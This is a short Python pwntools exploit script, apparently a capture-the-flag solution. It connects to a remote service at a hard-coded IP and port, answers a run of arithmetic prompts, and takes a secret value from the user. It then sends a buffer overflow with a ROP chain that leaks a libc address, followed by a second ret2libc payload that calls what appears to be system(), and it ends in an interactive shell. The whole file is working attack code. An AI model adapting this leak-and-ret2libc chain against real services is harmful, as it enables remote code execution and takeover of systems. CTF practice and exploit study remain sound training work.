from pwn import *

#r = process(["./twisted"])
r = remote("34.218.199.37", 6000)
g = process(["./twisted"])

for i in range(312):
	data = r.recvline()
	a = data.split("%")[0]
	b = data.split("%")[1].split("=")[0]
	r.sendline(str(int(a)%int(b)))

	data = g.recvline()
	a = data.split("%")[0]
	b = data.split("%")[1].split("=")[0]
	g.sendline(str(int(a)%int(b)))


sol = input("secret:")
payload = flat("a"*0x11,[sol,0x0804a300,0x80484E0,0x8048953,0x804a024])
r.sendline(payload)
r.recvuntil(":")
r.recvline()
libc = u32(r.recvn(4))-0x005f140
print hex(libc)

payload = flat("ssh\x00".ljust(0x11,"a"),[sol,0x0804a900,libc+0x0003a940,libc+0x03a940,0x0804a300-0x14])

r.sendline(payload)


r.interactive()
